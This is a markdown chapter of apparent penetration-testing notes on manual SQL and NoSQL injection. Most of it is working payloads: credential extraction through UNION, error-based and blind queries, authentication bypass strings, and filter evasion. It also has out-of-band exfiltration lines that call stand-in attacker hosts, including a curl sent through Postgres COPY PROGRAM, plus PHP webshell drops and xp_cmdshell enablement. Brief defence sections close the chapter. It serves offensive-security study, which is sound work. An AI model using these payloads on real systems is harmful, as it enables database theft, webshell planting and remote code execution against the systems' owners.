# 24 — SQL Injection Fundamentals

Detecting and exploiting SQL injection by hand. Automated exploitation lives in [25 SQLMap](25-sqlmap-essentials.md).

## Contents

- [Categories](#categories)
- [Detection](#detection)
- [DBMS fingerprinting](#dbms-fingerprinting)
- [UNION-based extraction](#union-based-extraction)
- [Error-based](#error-based)
- [Boolean blind](#boolean-blind)
- [Time-based](#time-based)
- [Out-of-band](#out-of-band)
- [DBMS-specific extras](#dbms-specific-extras)
- [Authentication bypass payloads](#authentication-bypass-payloads)
- [Filter bypasses](#filter-bypasses)
- [Webshell drops via SQLi](#webshell-drops-via-sqli)
- [NoSQL injection](#nosql-injection)
- [Defending (what the report should recommend)](#defending-what-the-report-should-recommend)
- [Sources](#sources)

## Categories

| Class | What you see | Use when |
|---|---|---|
| In-band — UNION | Data appears in the response | Visible columns, `UNION` is allowed |
| In-band — error-based | DB errors leak data | Verbose errors enabled |
| Inferential — boolean blind | Two distinct responses (true/false) | No data echoed, but content differs |
| Inferential — time-based | Response delay encodes truth | No content difference at all |
| Out-of-band | Data exfil via DNS/HTTP | DB can talk out (`xp_dirtree`, `LOAD_FILE`, `UTL_HTTP`) |

## Detection

Trigger an error or a behavior change. Common probe payloads (URL-encoded as needed):

```
'        "        \  ;     --      #     /* */
' OR '1'='1
' OR 1=1--
' OR 1=1#
" OR 1=1--
\\
)) OR ((1=1
') OR ('1'='1
1' AND 1=1--   1' AND 1=2--           ← boolean
1 AND SLEEP(5)                         ← time
1' WAITFOR DELAY '0:0:5'--             ← MSSQL time
```

Indicators of injection:

- 500 / DB stack trace.
- Different content / size for `1=1` vs `1=2`.
- Visible delay matching your `SLEEP()`.
- Response includes a quoted-and-escaped version of your input ⇒ probably parameterized; less likely SQLi.

## DBMS fingerprinting

```sql
-- DB-specific functions/variables that succeed/fail differently
@@version           -- MSSQL, MySQL
version()           -- Postgres, MySQL
banner FROM v$version  -- Oracle
sqlite_version()    -- SQLite

-- Comment styles
-- ...           ANSI SQL (often needs trailing space in MySQL: `-- `)
#                MySQL
/* ... */        most DBMSes
--+              URL-encode `--` + space as `--+`
```

Quick fingerprint payload:

```sql
1 AND IF(1=1, SLEEP(2), 0)        -- MySQL
1 AND 1=(SELECT 1) AND 'a'='a'    -- universal-ish
1; SELECT pg_sleep(2)--           -- Postgres
1; WAITFOR DELAY '0:0:2'--        -- MSSQL
```

## UNION-based extraction

1. **Number of columns** — increment until no error:

```sql
' ORDER BY 1--
' ORDER BY 2--
... ORDER BY N--      -- stop at error; last good = column count
```

Or use `UNION SELECT NULL,NULL,...`:

```sql
' UNION SELECT NULL--                 -- 1 col
' UNION SELECT NULL,NULL--            -- 2
```

2. **Reflected column types** — find a string-compatible column:

```sql
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
```

3. **DBMS info**:

```sql
' UNION SELECT @@version,NULL--                                       -- MySQL/MSSQL
' UNION SELECT version(),current_database()--                          -- Postgres
' UNION SELECT banner,NULL FROM v$version--                            -- Oracle
```

4. **Schema enumeration**:

```sql
-- MySQL / MariaDB
' UNION SELECT table_schema,table_name FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Postgres
' UNION SELECT table_schema,table_name FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- MSSQL
' UNION SELECT name,NULL FROM sys.databases--
' UNION SELECT name,NULL FROM <db>.sys.tables--
' UNION SELECT name,NULL FROM <db>.sys.columns WHERE object_id=object_id('users')--

-- Oracle (must use FROM dual when no real table)
' UNION SELECT table_name,NULL FROM all_tables--
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--

-- SQLite
' UNION SELECT name,sql FROM sqlite_master WHERE type='table'--
```

5. **Pull data**:

```sql
' UNION SELECT username,password FROM users--
' UNION SELECT GROUP_CONCAT(username,0x3a,password) FROM users--    -- MySQL one-shot
' UNION SELECT string_agg(username||':'||password,',') FROM users-- -- Postgres
```

## Error-based

When the application echoes DB errors, force a value into a function that reports it.

### MySQL

```sql
-- Classic double query
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--

-- updatexml (MySQL 5.1+)
' AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)--

-- extractvalue
' AND extractvalue(1,concat(0x7e,(SELECT user())))--
```

### MSSQL

```sql
'+CONVERT(int,(SELECT @@version))--    -- type conversion error leaks the string
'+CAST((SELECT TOP 1 name FROM sys.tables) AS int)--
```

### Postgres

```sql
' AND 1=CAST((SELECT version()) AS int)--
```

### Oracle

```sql
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--
' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE rownum=1))--
```

## Boolean blind

Two payloads that flip the response between two distinguishable states.

```sql
' AND 1=1--                        -- baseline (true)
' AND 1=2--                        -- baseline (false)

-- Extract one character at a time
' AND SUBSTRING((SELECT user()),1,1)='r'--                       -- MySQL
' AND SUBSTRING((SELECT TOP 1 name FROM sys.tables),1,1)='u'--   -- MSSQL
' AND SUBSTR((SELECT name FROM master.sqlite_master LIMIT 1),1,1)='u'--  -- SQLite

-- Binary search via ASCII
' AND ASCII(SUBSTRING((SELECT user()),1,1)) > 100--
' AND ASCII(SUBSTRING((SELECT user()),1,1)) > 110--
```

Burp Comparer + Intruder is the easiest manual workflow; for many parameters use SQLMap.

## Time-based

When you cannot tell true from false in the response, use delays.

```sql
-- MySQL
' AND IF(SUBSTRING((SELECT user()),1,1)='r',SLEEP(5),0)--
' AND BENCHMARK(5000000,SHA1(1))--

-- MSSQL
'; IF(SUBSTRING((SELECT TOP 1 name FROM sys.tables),1,1)='u') WAITFOR DELAY '0:0:5'--

-- Postgres
'; SELECT CASE WHEN (SUBSTRING((SELECT version()),1,1)='P') THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Oracle
' AND 1=(CASE WHEN (SUBSTR((SELECT user FROM dual),1,1)='S') THEN dbms_pipe.receive_message(('a'),5) ELSE 1 END)--

-- SQLite (no real sleep — use a heavy query)
' AND randomblob(100000000)--
```

## Out-of-band

Force the DB to make a network request you control.

```sql
-- MySQL (Windows + MySQL with FILE priv on UNC paths)
' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT user()),'.attacker.tld\\a'))--

-- MSSQL
'; EXEC master..xp_dirtree '\\<ATTACKER>\share'--
'; EXEC master..xp_fileexist '\\<ATTACKER>\x'--

-- Oracle
' UNION SELECT UTL_HTTP.REQUEST('http://attacker/?d='||(SELECT user FROM dual)) FROM dual--
' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.attacker.tld') FROM dual--

-- Postgres
COPY (SELECT '') TO PROGRAM 'curl http://attacker/?d=$(whoami)';
```

Catch with: Burp Collaborator, `tcpdump port 53`, your own DNS server, or `webhook.site`.

## DBMS-specific extras

### MySQL

```sql
SHOW DATABASES;
SHOW TABLES FROM <db>;
SHOW COLUMNS FROM <db>.<tbl>;

-- File read (FILE privilege)
SELECT LOAD_FILE('/etc/passwd');

-- File write (FILE privilege + writable dir)
SELECT '<?php system($_GET[c]); ?>' INTO OUTFILE '/var/www/html/x.php';

-- mysql client only: shell escape
\! id
```

### MSSQL

```sql
EXEC sp_databases;
EXEC sp_tables;
EXEC sp_columns 'users';

-- xp_cmdshell
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- File read
SELECT * FROM OPENROWSET(BULK 'C:\file.txt', SINGLE_CLOB) AS x;

-- Linked-server pivot
SELECT srvname FROM sysservers;
EXEC ('xp_cmdshell ''whoami''') AT [LINK];
```

### Postgres

```sql
SELECT version();
SELECT current_user, current_database();
SELECT * FROM pg_catalog.pg_tables WHERE schemaname='public';

-- Read file (superuser)
SELECT pg_read_file('/etc/passwd');

-- Write file (superuser)
COPY (SELECT '<?php system($_GET[c]); ?>') TO '/var/www/html/x.php';

-- COPY ... PROGRAM (superuser, RCE)
DROP TABLE IF EXISTS x; CREATE TABLE x(t text);
COPY x FROM PROGRAM 'id';
SELECT * FROM x;
```

### Oracle

```sql
SELECT * FROM all_tables;
SELECT * FROM v$version;

-- Java RCE on patched-old Oracle
-- DBMS_LDAP-based exfil
```

### SQLite

```sql
SELECT name, sql FROM sqlite_master WHERE type='table';
ATTACH DATABASE '/var/www/html/x.php' AS lemon;
CREATE TABLE lemon.pwn (dataz text);
INSERT INTO lemon.pwn (dataz) VALUES ('<?php system($_GET[c]); ?>');
```

## Authentication bypass payloads

```
admin' --
admin' #
admin'/*
admin') --
') OR ('1'='1
" OR ""="
') OR true--
' OR 1=1 LIMIT 1--
' OR 1=1#
' UNION SELECT 'admin','21232f297a57a5a743894a0e4a801fc3'--   -- md5(admin)
```

Always combine with a known username (`admin`, `root`, `administrator`, `guest`).

## Filter bypasses

```sql
-- Quote stripping
0x61646d696e                    -- hex 'admin' (MySQL)
CHAR(97)+CHAR(100)+CHAR(109)... -- MSSQL string from chars
CONCAT(CHAR(97),CHAR(100),...)

-- Keyword filtering
SELECT/**/user                   -- /**/ comment as space (MySQL)
SeLeCt user                      -- mixed case
%53ELECT                         -- URL-encoded letters
%2553ELECT                       -- double URL-encode
UNION%a0SELECT                   -- 0xa0 nbsp on some parsers

-- "OR" / "AND" filter
||  &&                           -- alternative operators (MySQL)
LIKE                              -- replaces =
REGEXP                            -- pattern match
```

## Webshell drops via SQLi

`INTO OUTFILE` (MySQL), `xp_cmdshell` (MSSQL), `COPY ... PROGRAM` (Postgres), `ATTACH DATABASE` (SQLite).

Once one of those works, you have RCE — pivot to a reverse shell.

## NoSQL injection

Different syntax, same root cause: untrusted input flows into a query language without parameterization. MongoDB is the most common target.

### Detection

```
# Login bypass via operator injection (MongoDB / Express body parsing)
{"username":"admin","password":{"$ne":null}}
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":{"$gt":""},"password":{"$gt":""}}
{"username":"admin","password":{"$regex":"^a"}}

# URL-encoded form (Express query parser interprets [op]=val as $op)
?username=admin&password[$ne]=
?username[$gt]=&password[$gt]=
?username[$regex]=^adm&password[$ne]=
```

### Boolean / blind extraction

```
# Confirm injection
{"username":"admin","password":{"$regex":"^."}}     # any char
{"username":"admin","password":{"$regex":"^a"}}      # starts with 'a'?
{"username":"admin","password":{"$regex":"^ab"}}     # then 'ab'?
```

### JavaScript-side execution (`$where` / `mapReduce`)

When MongoDB allows server-side JavaScript:

```
{"$where":"sleep(5000) && this.user=='admin'"}
{"$where":"this.password.match(/^a/) && sleep(2000)"}
```

`$where` execution is disabled by default in modern Mongo, but legacy stacks still run it.

### Tooling

```bash
nosqlmap                  # SQLMap-style automation for MongoDB / CouchDB
# Burp NoSQLi extension is the easiest manual workflow.
```

### CouchDB / Cassandra / Redis / Elasticsearch

- **CouchDB** — exposed `_all_dbs`, `_users` admin endpoints; CVE-2017-12635 / 12636 family for older instances.
- **Cassandra** — CQL is parameterized in modern drivers; legacy code with string concat is vulnerable.
- **Redis** — see [18 Attacking Common Services](18-attacking-common-services.md).
- **Elasticsearch** — query-DSL injection where user input lands in `_search` body; older versions had script-engine RCE.

### Defending (NoSQL specifically)

- Validate input type — reject objects where strings are expected.
- Use the driver's parameterized API (`{ user: req.body.username }` not string concatenation).
- Disable `$where` / `mapReduce` server-side JS in MongoDB unless required.
- Apply schema validation (Mongoose, Joi, JSON Schema).

## Defending (what the report should recommend)

- Parameterized queries / prepared statements (default in modern ORMs).
- Stored procedures with strict input typing.
- Least-privilege DB user (no FILE, no `xp_cmdshell`, no `COPY PROGRAM`).
- WAFs are layered defense, not a substitute.
- Generic error pages — never echo raw SQL errors.

## Sources

- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- PortSwigger Academy (SQLi): https://portswigger.net/web-security/sql-injection
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
- DBMS docs: dev.mysql.com, postgresql.org/docs, learn.microsoft.com/sql, oracle.com/database/technologies, sqlite.org/lang.html
